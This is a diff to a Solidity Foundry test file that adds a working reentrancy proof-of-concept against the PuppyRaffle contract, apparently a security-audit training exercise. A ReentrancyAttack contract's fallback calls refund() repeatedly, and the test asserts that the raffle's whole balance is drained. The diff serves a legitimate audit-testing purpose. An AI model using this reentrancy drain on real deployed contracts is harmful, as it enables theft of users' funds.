@@ -216,30 +216,21 @@ contract PuppyRaffleTest is Test {
     // 
     // Attacks
     // 
-    // contract ReentrancyAttack {
-    //     uint256 s_indexOfPlayer;
+    function test_srw_reentrancy_attack_can_pull_all_funds_via_refund() public playersEntered {
+        ReentrancyAttack attack = new ReentrancyAttack(
+            puppyRaffle, entranceFee
+        );
 
-    //     constructor() {
-    //         puppyRaffle.enterRaffle{value: entranceFee}(address(this));
-    //         s_indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-    //     }
+        vm.deal(address(attack), entranceFee);
 
-    //     function attack() {
-    //         puppyRaffle.refund(s_indexOfPlayer);
-    //     }
+        attack.enterRaffle();
+        assertEq(address(attack).balance, 0);
 
-    //     fallback() external payable {
-    //         puppyRaffle.refund(s_indexOfPlayer);
-    //     }
-    // }
+        attack.attack();
 
-    // function test_srw_reentrancy_attack_can_pull_all_funds_via_refund() public {
-    //     address[] memory players = new address[](1);
-    //     players[0] = playerOne;
-    //     puppyRaffle.enterRaffle{value: entranceFee}(players);
-    //     puppyRaffle.refund(0);
-    //     assertEq(puppyRaffle.players(0), address(0));
-    // }
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(attack).balance, entranceFee * 5);
+    }
 
     // function test_srw_entering_with_duplicate_players_leave_duplicate_player() public {
     //     address[] memory players = new address[](2);
@@ -248,4 +239,35 @@ contract PuppyRaffleTest is Test {
     //     vm.expectRevert("PuppyRaffle: Duplicate player");
     //     puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
     // }
+}
+
+contract ReentrancyAttack {
+    uint256 s_indexOfPlayer;
+    PuppyRaffle s_puppyRaffle;
+    uint256 s_entranceFee;
+    uint256 s_reentrancy_count = 4;
+
+    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
+        s_puppyRaffle = puppyRaffle;
+        s_entranceFee = entranceFee;
+    }
+
+    function enterRaffle() public {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+
+        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
+        s_indexOfPlayer = s_puppyRaffle.getActivePlayerIndex(address(this));
+    }
+
+    function attack() public {
+        s_puppyRaffle.refund(s_indexOfPlayer);
+    }
+
+    fallback() external payable {
+        if (s_reentrancy_count > 0) {
+            s_reentrancy_count -= 1;
+            s_puppyRaffle.refund(s_indexOfPlayer);
+        }
+    }
 }
